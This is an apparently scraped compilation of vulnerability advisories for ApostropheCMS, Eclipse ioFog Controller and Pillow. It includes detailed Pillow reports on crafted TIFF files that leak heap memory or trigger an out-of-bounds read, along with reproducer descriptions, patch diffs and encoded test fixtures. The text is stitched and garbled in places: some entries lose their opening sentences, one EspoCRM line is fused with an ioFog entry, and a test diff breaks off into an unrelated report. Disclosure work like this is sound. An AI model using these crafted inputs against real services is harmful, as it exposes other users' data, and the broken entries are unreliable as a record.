Unauthenticated disclosure of `visibility: private` and `loginRequired` pages (full documents, not just paths) and of the complete site structure with visibility/type metadata; contributors read admin-only page types and their protected fields. Because `_id`s are enumerable and leaked by `all=1`, this is systemic.

**Remediation** — Remove `.permission(false)` from `getOne`/`all` or re-apply the type's `viewRole` threshold plus the same `visibility`/login-required criteria the list and autocomplete paths use (mirror `piece-type`); make `publicApiCheck` config-presence-only and add an explicit authorization step per verb.

title: ApostropheCMS is an open-source Node.js content management system.
desc: ApostropheCMS is an open-source Node.js content management system. Prior to 4.33.0 of ApostropheCMS and 1.6.1 of passport-bridge, cross-host or cross-locale session migration places a single-use bearer session token in a redirect URL. A client that obtains and redeems a still-valid, unconsumed token before its first use can adopt the associated session, including through the passport-bridge cross-locale flow. This issue is fixed in ApostropheCMS 4.33.0 and passport-bridge 1.6.1.

title: ApostropheCMS is an open-source Node.js content management system.
desc: ApostropheCMS is an open-source Node.js content management system. Prior to 4.33.0, the REST route GET /api/v1/<piece-type>/:_id/locales (and the equivalent page route) does not apply the publicApiCheckAsync gate that ApostropheCMS's other read routes enforce. An unauthenticated caller can therefore query this route for any document _id and learn whether the document exists and which locales it is published in — a document-existence and locale-metadata disclosure that the read-API is otherwise supposed to gate. This issue is fixed in version 4.33.0.

title: ApostropheCMS is an open-source Node.js content management system.
desc: ApostropheCMS is an open-source Node.js content management system. Prior to 1.5.5 of the Form add-on, 1.2.1 of login-recaptcha, and 1.3.0 of login-hcaptcha, these three CAPTCHA integrations interpolate an unencoded user-supplied response token into the provider verification request. Crafted tokens can smuggle request parameters and disrupt CAPTCHA verification and CAPTCHA-gated form or login flows; automated bypass probing is possible, but a successful CAPTCHA bypass or secret disclosure is not established. This issue is fixed in Form 1.5.5, login-recaptcha 1.2.1, and login-hcaptcha 1.3.0.

title: ApostropheCMS is an open-source Node.js content management system.
desc: ApostropheCMS is an open-source Node.js content management system. Prior to 1.1.0 of db-connect and 4.33.0 of ApostropheCMS, an account with view-draft access can submit a projection exclusion path that traverses through a constructor prototype chain to a shared prototype member when a consumer uses a SQLite, PostgreSQL, or multipostgres adapter and has a matching document. Every editing role has view-draft access, while guestApiAccess broadens this prerequisite to any logged-in account. The unsetNestedField helper then deletes the shared runtime member, causing persistent process-wide integrity and availability effects; the default MongoDB adapter is not affected. This issue is fixed in db-connect 1.1.0 and ApostropheCMS 4.33.0.

title: ApostropheCMS is an open-source Node.js content management system.
desc: ApostropheCMS is an open-source Node.js content management system. Prior to 4.33.0, the notification module exposes PATCH and DELETE REST endpoints that perform operations directly on the underlying MongoDB collection without verifying that the requester is authenticated or owns the target notification. As a result, an unauthenticated attacker who obtains a valid notification ID can modify or permanently delete another user's notification. This issue is fixed in version 4.33.0.

title: ApostropheCMS is an open-source Node.js content management system.
desc: ApostropheCMS is an open-source Node.js content management system. Prior to 3.7.0 of the import-export module, an authenticated importer can submit a tar entry whose normalized destination targets a directory while bypassing the literal parent-path substring guard. Opening that directory as a write stream emits an unhandled filesystem error that can terminate the Node.js process; the source establishes this static primitive but not an end-to-end exploit or controlled arbitrary file read or write. This issue is fixed in version 3.7.0.

title: ApostropheCMS is an open-source Node.js content management system.
desc: ApostropheCMS is an open-source Node.js content management system. Prior to 3.7.0 of the import-export module, an authenticated user with import access to a target type can supply an object or operator as an update-key value, causing the import query to match an unidentified existing document that the user has generic edit permission to modify. The normal findForEditing permission filter still limits the candidate documents, so the issue does not permit permission-free overwrite of arbitrary protected content. This issue is fixed in version 3.7.0.

title: ApostropheCMS is an open-source Node.js content management system, and sanitize-html provides a simple HTML sanitizer with a clear API.
desc: ApostropheCMS is an open-source Node.js content management system, and sanitize-html provides a simple HTML sanitizer with a clear API. Prior to sanitize-html 2.18.0, a non-default configuration that allows meta refresh elements and their http-equiv and content attributes can retain unsafe script or redirect destinations embedded in the refresh content value. This issue is fixed in sanitize-html 2.18.0.

title: ApostropheCMS is an open-source Node.js content management system.
desc: ApostropheCMS is an open-source Node.js content management system. Prior to 4.33.0, ApostropheCMS’s exist-in-locale API allows an authenticated low-privilege user to determine whether restricted documents exist in a specified locale and mode, including draft mode. The endpoint returns localized document identifiers without applying document-level view or edit authorization criteria. This issue is fixed in version 4.33.0.

title: ApostropheCMS is an open-source Node.js content management system.
desc: ApostropheCMS is an open-source Node.js content management system. Prior to 4.33.0, an unauthenticated attacker can send a crafted link whose query string is automatically parsed by apos.http.parseQuery when an authenticated victim loads a page with the admin bundle. The parser accepts the special __proto__, constructor, and prototype path keys, allowing browser prototype mutation that can reach an unsafe DOM sink and execute script in the victim's session; anonymous visitors do not load the affected admin context. This issue is fixed in version 4.33.0.

title: ApostropheCMS is an open-source Node.js content management system.
desc: ApostropheCMS is an open-source Node.js content management system. Prior to 4.33.0, the unauthenticated Rich Text CSV conversion route writes a multipart upload to the system temporary directory before checking its extension and does not remove the staged file when that validation rejects it. Repeated large rejected uploads, using the normal public CSRF cookie, can persistently consume temporary-disk capacity and may disrupt ApostropheCMS and other services that depend on the same partition. This issue is fixed in version 4.33.0.

title: ApostropheCMS is an open-source Node.js content management system, and sanitize-html provides a simple HTML sanitizer with a clear API.

The bypass can rewrite a link destination to an unsafe URI after the sanitized SVG is rendered, with script execution occurring when a user activates the affected link; the default sanitizer configuration is not unconditionally affected. This issue is fixed in sanitize-html 2.18.0.

title: ApostropheCMS is an open-source Node.js content management system.
desc: ApostropheCMS is an open-source Node.js content management system. Prior to 1.5.5 of the ApostropheCMS Form add-on, its form submission route stages unbounded multipart uploads before form validation or authentication and lacks upload size, count, and rate limits. Repeated unauthenticated submissions can consume temporary disk storage and disrupt form handling or other host services. This issue is fixed in ApostropheCMS Form 1.5.5.

title: ApostropheCMS is an open-source Node.js content management system.
desc: ApostropheCMS is an open-source Node.js content management system. The non-default nesting must already exist, and the bypass is limited to sibling ordering rather than arbitrary content modification, confidentiality loss, or creation of the restricted nesting. This issue is fixed in version 4.33.0.

title: ApostropheCMS is an open-source Node.js content management system, and sanitize-html provides a simple HTML sanitizer with a clear API.
desc: ApostropheCMS is an open-source Node.js content management system, and sanitize-html provides a simple HTML sanitizer with a clear API. Because scripting-enabled browsers treat noscript content as raw text while the parser does not model that mode, content intended to remain inert can survive sanitization and render; the issue does not generalize to every default nonTextTags element. This issue is fixed in sanitize-html 2.18.0.

title: ApostropheCMS is an open-source Node.js content management system.
desc: ApostropheCMS is an open-source Node.js content management system. Inadequately limited templates, including serialization of an entire related user object, can conditionally disclose user fields, but relationships do not automatically publish full user objects and password hashes are stored separately and are not affected. This issue is fixed in version 4.33.0.

title: ApostropheCMS is an open-source Node.js content management system.
desc: ApostropheCMS is an open-source Node.js content management system. From 1.25.0 until 1.28.0, uploadfs Azure backend leaks account-level SAS token into every public attachment URL. This issue is fixed in version 1.28.0.

title: ApostropheCMS is an open-source Node.js content management system, and uploadfs is its file storage library.
desc: ApostropheCMS is an open-source Node.js content management system, and uploadfs is its file storage library. Exploitability depends on an application exposing the relevant uploadfs operations to untrusted path. This issue is fixed in uploadfs 1.28.0.

desc: A vulnerability was found in EspoCRM up to 9.3.10/10.0.10. title: In Eclipse ioFog Controller versions 3.8.0 through 3.9.1, operator WebSocket upgrades on the exec and log routes do not verify the bearer JWT.
desc: In Eclipse ioFog Controller versions 3.8.0 through 3.9.1, operator WebSocket upgrades on the exec and log routes do not verify the bearer JWT. The payload is decoded and its groups or roles are used as RBAC subjects. A self-minted token whose groups contain admin matches the built-in admin role, with no account and no RoleBinding. The attacker can open an exec or log session for a microservice or fog whose UUID they already know. HTTP routes are not affected: they verify the token before RBAC. Agent WebSockets verify the fog token and are not affected.

title: In Eclipse ioFog Controller versions 3.8.0 through 3.9.1, POST, PUT, and PATCH bodies on routes that enable template substitution are rendered by an uncapped Liquid engine before…
desc: In Eclipse ioFog Controller versions 3.8.0 through 3.9.1, POST, PUT, and PATCH bodies on routes that enable template substitution are rendered by an uncapped Liquid engine before authentication and RBAC. The bearer check does not reject a missing or invalid token, and the auth rate limit applies only to user login routes. A small JSON body can stall or abort the Controller process. The anonymous caller does not receive the rendered result; the impact is availability of the control plane, including the agent API and in-process WebSocket relays on that process.

title: Pillow: TiffDecode returns uninitialized memory as pixels for short JPEG strips
desc:
``` ============================================================================ TiffDecode returns uninitialized memory as pixels for short JPEG strips Location: src/libImaging/TiffDecode.c:554 in _decodeStrip() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` Pillow hands back leftover process memory as image pixels when it opens a small crafted TIFF file. Anyone who can get an application to open their image, and can see something produced from its pixels (a thumbnail, a preview, a converted copy), can read heap memory that the process had previously used and freed. This works in the default configuration: opening and loading the 478-byte file succeeds with no error or warning, and every row below the first eight holds stale memory instead of picture content. The bug is in `_decodeStrip()` in `src/libImaging/TiffDecode.c`, and `_decodeTile()` has the same shape. The function `realloc()`s `state->buffer` to `TIFFStripSize()` bytes without initialising it and calls `TIFFReadEncodedStrip()`. Whenever that call does not return -1, it copies all `RowsPerStrip` rows of the buffer into the image. libtiff's JPEG codec only warns when the JPEG embedded in a strip has fewer rows than the strip, and Pillow silences libtiff warnings. The codec decodes the rows that exist and still returns the full strip size, so the untouched remainder is copied out as pixels. libtiff's Group 4 fax codec behaves the same way for a stream that ends early. The attached reproducer builds a 256×256 TIFF whose single strip or tile is a 256×8 JPEG. Before loading it, the script frees buffers filled with `b"LEAK"`. It then finds 15,872 copies of `LEAK` in rows 8–255 of the decoded image (the same freed chunk was reused in 500 of 500 runs). Under glibc's `MALLOC_PERTURB_`, those rows are entirely the allocator's fill byte. A well-formed control file decodes correctly in both cases. This is a read of uninitialised heap memory, not memory corruption. Each strip can disclose up to width × `RowsPerStrip` bytes, and what comes back depends on the allocator's state at the time. The strip path was introduced in e91b851fdc1c ("Add reading old-JPEG compressed TIFFs", first released in Pillow 6.0.0). The tile path has had the same pattern since f0436a4ddc95 (Pillow 5.3.0). ## Details `src/libImaging/TiffDecode.c` decodes compressed TIFFs through libtiff into a strip (or tile) buffer that it `realloc()`s to `TIFFStripSize()` bytes and never initialises, and then copies all `RowsPerStrip` rows of that buffer into the image whenever `TIFFReadEncodedStrip()` does not return -1. libtiff's JPEG codec does not fail when the JPEG stream inside a strip has fewer rows than the strip: it decodes the rows that exist and returns the full strip size. The rows it did not write are whatever the heap held before, and Pillow returns them as pixels. A 478-byte file shows it: a classic little-endian TIFF, 256×256, `BitsPerSample=8`, `Compression=7`, `PhotometricInterpretation=1`, `RowsPerStrip=256`, one strip whose data is a baseline JPEG of 256×**8** pixels (as written by `Image.new("L",(256,8),200).save(…,"JPEG")`). `Image.open(BytesIO(data)).load()` succeeds with default settings (compressed TIFFs always take the libtiff path). Rows 0–7 of the result are the JPEG content (value 200); the remaining 63488 bytes of `im.tobytes()` are heap garbage: run under glibc's `MALLOC_PERTURB_=1` they are all `0xFE`, under `MALLOC_PERTURB_=170` all `0x55` (the fresh-`malloc` fill byte), and in a process that has just freed buffers containing `b"LEAK"` they contain 15872 copies of `LEAK`. Feeding the same file to libtiff 4.5.0 directly confirms the library side: `TIFFReadEncodedStrip(t, 0, buf, 65536)` prints `JPEGPreDecode: Warning, Improper JPEG strip/tile size, expected 256x256, got 256x8.`, returns 65536, and leaves 63488 of the 65536 buffer bytes untouched. Pillow installs `TIFFSetWarningHandler(NULL)` (`TiffDecode.c:682`), so the warning is not visible either. The strip path: ```c // src/libImaging/TiffDecode.c:552 /* realloc to fit whole strip */ /* malloc check above */ new_data = realloc(state->buffer, state->bytes); // state->bytes = TIFFStripSize() … state->buffer = new_data; for (; state->y < state->ysize; state->y += rows_per_strip) { … if (TIFFReadEncodedStrip( tiff, TIFFComputeStrip(tiff, state->y, plane), (tdata_t)state->buffer, strip_size ) == -1) { … return -1; } … // iterate over each row in the strip and stuff data into image for (strip_row = 0; strip_row < MIN((INT32)rows_per_strip, state->ysize - state->y); strip_row++) { … shuffler( (UINT8 *)im->image[state->y + state->yoff + strip_row] + state->xoff * im->pixelsize, state->buffer + strip_row * row_byte_size, state->xsize ); ``` `state->buffer` arrives here as the one-row `calloc` made by `decode.c:230` (`(bits*xsize+7)/8` = 256 bytes for the example). The `realloc` to 65536 bytes hands back a different, uninitialised chunk; nothing zeroes it. `TIFFReadEncodedStrip()` returns the nominal strip size on success, not the number of rows produced, and the only check is `== -1`, so the row loop unconditionally copies 256 rows × 256 bytes into `im->image` (which itself is zeroed by `core.new`, so the garbage provably comes from `state->buffer`). `_decodeTile()` has the same shape (`TiffDecode.c:448` `realloc` to `TIFFTileSize()`, then `tile_length` rows copied after each `TIFFReadTile()` at 460–488). For a well-formed file the JPEG inside the strip is 256×256, libtiff fills all 65536 bytes and the copy is correct. The malicious file differs only in the SOF height of the embedded JPEG; libtiff treats "JPEG smaller than strip" as a warning, clamps the row count to the JPEG height, and reports success. JPEG is not the only libtiff codec that succeeds on a short strip. `Fax4Decode` (`Compression=4`) returns success for a T.6 stream that ends early: a 133-byte 512×256 1-bit TIFF whose strip is the Group 4 stream of a 512×16 image loads without error, libtiff writes 17 rows (1088 bytes) of the 16384-byte buffer (`Fax4Decode: Warning, Premature EOL at line 16`, return value 16384) and the other 15296 bytes are again heap contents. LZW, Deflate, PackBits, Group 3 and CCITT RLE were checked and do return -1 on short data, so Pillow raises `OSError` for those. The strip path was introduced in `e91b851fdc1c` ("Add reading old-JPEG compressed TIFFs", 2018-12-08), first released in Pillow 6.0.0, which replaced row-by-row `TIFFReadScanline()` (where libtiff errors on the first missing row) with the whole-strip `realloc()` and copy. The tile path has had the same shape since it was added in `f0436a4ddc95` (2018-07-02, Pillow 5.3.0). ## Impact Any application that opens attacker-supplied images with Pillow in the default configuration and returns something derived from the pixels (thumbnail, preview, format conversion, OCR text) discloses freed heap memory of the worker process to the uploader: everything below the rows the embedded JPEG/G4 stream actually encodes, up to `ImageWidth × RowsPerStrip × SamplesPerPixel` bytes per strip and tens of MB per image within the default `MAX_IMAGE_PIXELS`. `load()` raises nothing, so the application has no signal that the image is malformed. What comes back depends on allocator state; in a long-running web worker it is typically recently freed request bodies, other users' decoded image buffers and Python object contents. There is no memory corruption; this is a read of uninitialised (previously used) heap memory, analogous in effect to an out-of-bounds read that lands in pixels. ## Reproducing `repro` is a short Python script that runs against the installed Pillow build with default settings: no rebuild, no sanitizer, no files written. It runs twice, once normally and once re-executing itself under glibc's `MALLOC_PERTURB_=170`, and the last line it prints is `BUG` or `OK`. **Input.** `tiff(jpeg_rows, tiled)` builds a little-endian TIFF in memory. The header declares a 256×256 8-bit greyscale image with `Compression=7` (JPEG), either as one strip (`RowsPerStrip=256`) or as one 256×256 tile (`TileWidth`/`TileLength`). The strip or tile is a baseline JPEG of 256×`jpeg_rows` pixels, all value 200, written by Pillow's own JPEG encoder. For each layout the script builds two files: - **Control:** `jpeg_rows=256`. This is a well-formed file, and libtiff fills the whole 64 KiB strip/tile. - **Crafted:** `jpeg_rows=8`, 478 bytes (strip) or 490 bytes (tile). The only difference is the embedded JPEG's height. libtiff decodes 8 rows (2048 bytes), warns `Improper JPEG strip/tile size` (Pillow silences the warning) and returns the full strip/tile size as success. **Steps.** Each file is opened (the script asserts it takes the `libtiff` decoder). Just before `im.load()` the script allocates and frees six 64 KiB `bytearray`s filled with `b"LEAK"`, which leaves freed heap chunks about the size of the buffer that `_decodeStrip()`/`_decodeTile()` is about to `realloc()`. For rows 8–255 it then counts copies of `LEAK` and bytes equal to `0x55` (glibc's fresh-`malloc` fill under `MALLOC_PERTURB_=170`). The files contain no `LEAK` bytes (the script asserts this), so any copy in the image came from freed heap memory. It reports `BUG` if a crafted file shows any `LEAK` in the normal pass, or rows 8–255 entirely `0x55` in the perturbed pass. **Expected output on this tree:** ``` [normal ] strip well-formed (1222 B) rows 8-255: 0 x b'LEAK', 0/63488 == 0x55, head=b'\xc8\xc8\xc8\xc8\xc8\xc8\xc8\xc8' [normal ] strip crafted ( 478 B) rows 8-255: 15872 x b'LEAK', 0/63488 == 0x55, head=b'LEAKLEAK' [normal ] tiled well-formed (1234 B) rows 8-255: 0 x b'LEAK', 0/63488 == 0x55, head=b'\xc8\xc8\xc8\xc8\xc8\xc8\xc8\xc8' [normal ] tiled crafted ( 490 B) rows 8-255: 15872 x b'LEAK', 0/63488 == 0x55, head=b'LEAKLEAK' [perturb] strip well-formed (1222 B) rows 8-255: 0 x b'LEAK', 0/63488 == 0x55, head=b'\xc8\xc8\xc8\xc8\xc8\xc8\xc8\xc8' [perturb] strip crafted ( 478 B) rows 8-255: 0 x b'LEAK', 63488/63488 == 0x55, head=b'UUUUUUUU' [perturb] tiled well-formed (1234 B) rows 8-255: 0 x b'LEAK', 0/63488 == 0x55, head=b'\xc8\xc8\xc8\xc8\xc8\xc8\xc8\xc8' [perturb] tiled crafted ( 490 B) rows 8-255: 0 x b'LEAK', 63488/63488 == 0x55, head=b'UUUUUUUU' BUG ``` `im.load()` succeeds for every file. For the crafted files rows 8–255 are the uninitialised strip/tile buffer, copied as-is into the image. With the attached patch applied, rows 8–255 of the crafted files come back as `\x00` bytes, with no `LEAK` and no `0x55`, and the script ends with `OK`. The `LEAK` count depends on where glibc places the buffer (the same freed chunk was reused in 500 of 500 runs here); the `MALLOC_PERTURB_` pass does not. The script covers the JPEG codec only. The Group 4 variant in the Details section (`Compression=4`, a T.6 stream that ends early) goes through the same `_decodeStrip()` copy, and the same fix covers it. ## Suggested fix The attached patch zeroes `state->buffer` before each libtiff read in both loops of `src/libImaging/TiffDecode.c` — before `TIFFReadTile()` in `_decodeTile()` and before `TIFFReadEncodedStrip()` in `_decodeStrip()` — so rows a codec does not produce are deterministic zeros rather than stale heap: ```diff --- a/src/libImaging/TiffDecode.c +++ b/src/libImaging/TiffDecode.c @@ _decodeTile for (x = state->xoff; x < state->xsize; x += tile_width) { + memset(state->buffer, 0, state->bytes); if (TIFFReadTile(tiff, (tdata_t)state->buffer, x, y, 0, plane) == -1) { @@ _decodeStrip for (plane = 0; plane < planes; plane++) { ImagingShuffler shuffler = unpackers[plane]; + memset(state->buffer, 0, state->bytes); if (TIFFReadEncodedStrip( ``` A `memset` per strip/tile (rather than one `calloc` after the size is known) is needed because the same buffer is reused for every strip, and a short last strip would otherwise expose the previous strip's rows — harmless for disclosure, but the per-read `memset` keeps the behaviour uniform at the cost of one extra pass over the buffer. Promoting libtiff warnings to errors via a warning handler is not a good alternative: both codecs only warn (`Improper JPEG strip/tile size`, `Premature EOL`), but so do many legitimate files (unknown tags, bad tag counts), and the return value of `TIFFReadEncodedStrip()` carries no row count to check against. Initialising the buffer covers every codec. `_decodeAsRGBA()` needs no change: `TIFFRGBAImageGet()` fills its whole raster, and JPEG files do not reach it (`JPEGCOLORMODE_RGB` sends them down the strip path). Valid files decode exactly as before; rows a codec does not produce are now black instead of garbage, and nothing that previously loaded now fails. The patch also adds `test_jpeg_short_strip` to `Tests/test_file_libtiff.py`, parametrised over strip and tile, which builds the 256×8-JPEG-in-256×256 file and asserts rows 8–255 are zero. It is a regression guard for the fixed code rather than a reliable detector of the bug: in a fresh pytest process the unfixed strip variant can pass because the new heap chunk happens to be zero (the tiled variant fails before the fix). With the patch, `Tests/test_file_libtiff.py` and `Tests/test_file_tiff.py` pass and the reproducer prints `OK`. ## The patch Zero the libtiff strip/tile buffer before each TIFFReadEncodedStrip/TIFFReadTile in TiffDecode.c so short strips do not expose uninitialised heap Applies to `src/libImaging/TiffDecode.c` at the commit above. ```diff diff --git a/Tests/test_file_libtiff.py b/Tests/test_file_libtiff.py index 3d804ea4a..67bc96329 100644 --- a/Tests/test_file_libtiff.py +++ b/Tests/test_file_libtiff.py @@ -1162,6 +1162,45 @@ class TestFileLibTiff(LibTiffTestCase): im.load() assert im.size == (950, 975) + @pytest.mark.parametrize("tiled", (False, True)) + def test_jpeg_short_strip(self, tiled: bool) -> None: + # The JPEG data in the strip/tile only contains 8 of the 256 rows that + # RowsPerStrip/TileLength declare. libtiff decodes the rows that exist + # and still reports success, so the remaining rows must be cleared + # rather than left as uninitialised memory. + jpeg = io.BytesIO() + Image.new("L", (256, 8), 200).save(jpeg, "JPEG") + jpeg_data = jpeg.getvalue() + + ifd = TiffImagePlugin.ImageFileDirectory_v2() + ifd[256] = 256 # ImageWidth + ifd[257] = 256 # ImageLength + ifd[258] = 8 # BitsPerSample + ifd[259] = 7 # Compression: JPEG + ifd[262] = 1 # PhotometricInterpretation: BlackIsZero + ifd[277] = 1 # SamplesPerPixel + if tiled: + ifd[322] = 256 # title: Pillow: TIFF encoder ColorMap plane-size mismatch causes a heap out-of-bounds read
desc:
## Summary

A small attacker-supplied TIFF can be opened and loaded normally, then reach an out-of-bounds read when an application saves it back to TIFF with retained metadata. The fixed reproducer is a 1×1, 16-bit grayscale, PackBits-compressed TIFF containing tag 320 (ColorMap) with **768 SHORT values**: three zero-filled planes of 256 entries each. No Python object is forged and no metadata is injected after loading.

Pillow's TIFF encoder allocates **768 × 2 = 1536 bytes**, then passes three plane pointers separated by 256 SHORT entries to libtiff. With `BitsPerSample = 16`, libtiff instead expects **65536 SHORT values per plane** and attempts a **131072-byte read** from a plane pointer. Existing ASAN observations identify a heap-buffer-overflow READ crossing the 1536-byte allocation made in `PyImaging_LibTiffEncoderNew`.

The malformed ColorMap need not be a valid palette for this grayscale image. The issue is that accepted metadata is forwarded on save without reconciling the fixed plane extent with the effective sample depth. Opening/loading alone is not the demonstrated fault; the encoder path is required.

## Impact and prerequisites

An application must accept the input, retain the relevant TIFF metadata, and invoke the libtiff-backed TIFF save path. The observed consequence is an out-of-bounds read and ASAN termination. Process-memory exposure during encoding is a potential consequence, **not demonstrated by extracting arbitrary heap contents in this report**. No arbitrary read primitive, full memory-disclosure chain, code execution, address-space bypass, or cross-process effect is claimed.

The 131072-byte attempted copy is not the number of bytes proven disclosed. This report does not run a synthetic-canary serializer or collect an unsanitized encoded output.

## Tested environment and limits of the evidence

The existing observations were recorded on August 30, 2026, with **CPython 3.11.8 on macOS ARM64**, using the unmodified official **Pillow 12.3.0** wheel and its bundled **libtiff 4.7.1**:

- Wheel: `pillow-12.3.0-cp311-cp311-macosx_11_0_arm64.whl`
- Wheel size: `4785266` bytes
- Wheel SHA-256: `37d6d0a00072fd2948eb22bce7e1475f34569d90c87c59f7a2ec59541b77f7a6`
- Pillow source revision: `bb1d8e8ab8d29048624d96e3ee53cecf7c13d13d`
- Bundled libtiff SHA-256: `e8988717b7470394a47d5ccd343130796b24ee70b6d885d3818e0e0b53238be1`

Apple's ASAN runtime was injected at process startup. This is **not an ASAN-rebuilt Pillow wheel**; allocation/memcpy interception detects the reported boundary violation, but the wheel's native instructions are not comprehensively instrumented.

Only this concrete full-package environment is established here. No affected-version range, current development-branch result, or patched release is asserted. Severity is **Unknown**; no CVSS score is proposed.

Separate earlier evidence reached the original Pillow 8.0.1 encoder constructor compiled as a component against a modern Python/libtiff environment. **That was not a complete Pillow 8.0.1 installation** and does not establish the historical package's full runtime behavior. It is not part of this reproducer or an affected-version range.

## Observed evidence and controls

The earlier integration harness performed the natural sequence `Image.open(BytesIO(input))`, `image.load()`, then `image.save(BytesIO(), format="TIFF")`, without replacing the image's metadata. Each case was recorded three times:

| Original fixture | Bytes | Recorded result |
| --- | ---: | --- |
| `colormap16` | 1685 | Loaded as `I;16`; save terminated with ASAN exit 86, READ of size 131072 crossing a 1536-byte heap region (3/3). |
| `colormap8` | 1684 | Same fixed ColorMap, but 8-bit samples; save succeeded and retained SHORT/count 768 (3/3). |
| `colormap_absent` | 137 | Same 16-bit geometry without ColorMap; save succeeded (3/3). |

Address-free summary of the recorded native diagnostic:

```text
AddressSanitizer: heap-buffer-overflow
READ of size 131072
0 bytes after 1536-byte region
Copy path: memcpy -> _TIFFmemcpy -> setByteArray -> _TIFFsetShortArrayExt
           -> _TIFFVSetField -> TIFFVSetField -> ImagingLibTiffSetField
           -> PyImaging_LibTiffEncoderNew
Allocation: calloc -> PyImaging_LibTiffEncoderNew
```

Input SHA-256 values (also enforced inside the script):

- `colormap16`: `5f38e0ead90b97949fb0c98c63f9c68d00ba9181db6631ecb8927376dcc75f4d`
- `colormap8`: `fdb26d9135549ed44824901985086c5ee4f06515699ca3291e498c523935405c`
- `colormap_absent`: `bd54979624f3ffb713342e0458caff9e17c477f940cda2f0960feebfabbc9556`

## Root cause and source references

- [Pillow `src/encode.c`, lines 870–899, pinned revision](https://github.com/python-pillow/Pillow/blob/bb1d8e8ab8d29048624d96e3ee53cecf7c13d13d/src/encode.c#L870): the ColorMap tuple must contain exactly 768 entries; a 1536-byte allocation is passed with a fixed stride of 256. The check does not reconcile that extent with `BitsPerSample`.
- [Pillow `src/PIL/TiffImagePlugin.py`, lines 1944–1991, pinned revision](https://github.com/python-pillow/Pillow/blob/bb1d8e8ab8d29048624d96e3ee53cecf7c13d13d/src/PIL/TiffImagePlugin.py#L1944): save carries supplied tags into the libtiff encoder and sorts the tags, so sample depth is established before ColorMap.
- [libtiff `tif_dir.c`, lines 441–448, pinned revision](https://gitlab.com/libtiff/libtiff/-/blob/5fe20d0e9aba49a6a350ed533459d1505203838f/libtiff/tif_dir.c#L441): `TIFFTAG_COLORMAP` computes the per-plane count as `1L << td->td_bitspersample` and copies that many SHORTs from each pointer.

The reported boundary is Pillow's construction of a fixed-sized array for a native API whose required size depends on metadata; this does not establish a standalone libtiff defect for a correctly sized caller buffer.

## Prior art and disclosure scope

[Pillow PR #5148](https://github.com/python-pillow/Pillow/pull/5148), merged December 28, 2020, is related TIFF metadata prior art, but its archived diff replaces a short-lived stack field-name pointer with the persistent literal `"CustomField"`. That is a **different field-name-lifetime fix**, not this plane-size mismatch. The reviewed material does not establish an exact prior public report or fix for this root, and **novelty is not asserted**. This specific report remains NOT_SENT; association with other observations is not a prior disclosure of it.

## Reproduction instructions

Use an **already reviewed, existing** installation of the exact wheel above, an existing compatible macOS ARM64 CPython 3.11 interpreter, and an existing compatible Apple ASAN runtime. `--package-path` is the absolute directory containing `PIL`, not the `PIL` directory itself. The script does not install, download, build, patch, or submit anything. It checks selected key package files against the original installation's hashes and checks the loaded package/version; these checks are not a full installation attestation.

Save the complete Python block below as `reproduce.py` and run:

```sh
python3.11 -I -S -B reproduce.py \
  --package-path /absolute/path/to/reviewed/site-packages \
  --asan-runtime /absolute/path/to/reviewed/libclang_rt.asan_osx_dynamic.dylib
```

Both arguments are required. The runtime must be loaded at child startup, not by late `dlopen`. Each child resolves `__asan_init`, `__asan_address_is_poisoned`, and `__asan_region_is_poisoned` in its actual process symbol table **before importing Pillow or opening a fixture**. Merely setting `DYLD_INSERT_LIBRARIES` is not accepted as proof of ASAN availability. A missing symbol or package mismatch prevents the operation.

Each of the three cases runs once in a separate child with a **30-second wall limit, 10-second hard CPU limit, core dumps disabled, and 1 MiB regular-file-size limit**. The parent supplies a clean allowlisted environment, isolated Python startup (`-I -S -B`), an empty temporary working directory, no stdin, and a 128 KiB combined pipe-output cap. Timeout/output-cap handling kills the child's process group. These limits are containment measures, not a security sandbox. No TIFF is written to disk. Temporary directories are removed; raw diagnostics are never forwarded or persisted.

The compressed/base64 constants below are the **unchanged original benign TIFF fixtures**, with decompressed size and SHA-256 checks. There are no external fixture dependencies. The standalone script supplied with this description is byte-for-byte the same as this block.

**Separate August 31, 2026 inline validation:** the exact embedded standalone script passed all three fixed cases: one ASan READ of 131,072 bytes crossing a 1,536-byte allocation and two passing controls. Child guards and limits passed, with no timeout. This is additional bounded evidence, separate from earlier runs; no new build, install, full historical chain or older-version integration replay was performed.

## Expected results from the standalone script

Cases run in order: `colormap8`, `colormap_absent`, `colormap16`. Every printed line should have `guard_passed: true`, `within_limits: true`, and `expected_observation: true`. The first two require successful saves and the expected retained sample-depth/ColorMap fields. The last requires ASAN exit 86 **and** the specific READ/extent/stack signatures, not merely any crash. Only the two controls inspect encoded metadata; the unsafe case never exports an encoded TIFF.

The parent exits 0 only if all three expectations match; 1 means a case did not match (including guard failure or a changed ASAN diagnostic), and 2 means parent setup failed. A failed guard, timeout, unrelated crash, or missing diagnostic is **inconclusive**, not evidence that the defect is absent. Do not bypass the ASAN guard to obtain an output TIFF.

## Complete standalone reproducer

               'fdb26d9135549ed44824901985086c5ee4f06515699ca3291e498c523935405c',
               'eNrz9NRi4GBgYOBmYGBkYWAEssAYic3EyAymQaqYoWzWBgYGNigbhAWh6iexMTCIIomLIZkjDmUzAbEMkhoHIJsBiCYxjIJRMApGwSgY2QAAPu0DiA=='],
 'colormap_absent': [137,
                     'bd54979624f3ffb713342e0458caff9e17c477f940cda2f0960feebfabbc9556',
                     'eNrz9NRi4GBgYOBiYGBkYWAEssAYic3EyAymBYCYGcpmbWBgYIOyQVgQqr4NiEWRxMWQzBGHspmBWAZJDQOEBgDj8wKm'],
 'colormap16': [1685,
                '5f38e0ead90b97949fb0c98c63f9c68d00ba9181db6631ecb8927376dcc75f4d',
                'eNrz9NRi4GBgYOBmYGBkYWAEssAYic3EyAymBYCYGcpmbWBgYIOyQVgQqn4SGwODKJK4GJI54lA2MxDLIKlxALJBgpMYRsEoGAWjYBSMZACsEwB78wOS']}
